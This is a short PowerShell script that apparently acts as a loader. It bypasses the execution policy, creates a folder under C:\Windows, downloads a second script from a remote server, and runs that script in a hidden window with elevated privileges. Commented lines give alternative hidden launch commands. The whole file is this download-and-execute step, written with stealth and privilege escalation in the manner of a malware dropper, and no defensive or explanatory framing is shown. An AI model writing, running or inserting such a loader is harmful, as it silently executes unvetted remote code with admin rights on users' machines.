#$currentlocation = Get-Location
#$src = $currentlocation+"\client.ps1"
#powershell.exe -command "start-process powershell '-ExecutionPolicy Bypass -Command "$src -ExecutionPolicy Bypass -Windowstyle hidden -noexit -noprofile"'"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
if (!(Test-Path "C:\windows\soa\"))
{New-Item -path "C:\Windows\soa" -ItemType Directory -Force}
(new-object net.webclient).downloadfile("http://cdisc.co.kr:1024/soa/download/initial.ps1", "C:\Windows\soa\initial.ps1")

powershell -noprofile -WindowStyle hidden -command "&{ start-process powershell -ArgumentList '-noprofile -Windowstyle hidden -file C:\Windows\soa\initial.ps1' -verb RunAs}"
#powershell.exe -command "start-process powershell '-ExecutionPolicy Bypass -Command "C:\Windows\soa\initial.ps1 -ExecutionPolicy Bypass -Windowstyle hidden -noexit -noprofile"'"
#powershell.exe -command "start-process powershell '-ExecutionPolicy Bypass -Command "C:\Windows\soa\initial.ps1 -ExecutionPolicy Bypass -noexit -noprofile"'"
